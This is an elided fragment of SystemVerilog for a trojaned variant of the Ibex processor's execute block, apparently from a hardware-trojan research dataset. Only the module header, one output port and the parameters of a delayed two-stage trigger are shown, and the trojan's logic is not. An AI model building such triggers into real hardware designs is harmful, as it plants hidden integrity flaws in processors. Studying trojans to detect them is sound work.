 ...
 */
module ibex_ex_block_trojan_Integrity #(
  ...
  output logic                  ex_valid_o             // EX has valid output
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=7819, act=3909)
    // ============================================================
    localparam int ARM_THRESHOLD   = 7819;
    localparam int ACTIVATE_DELAY  = 3909;
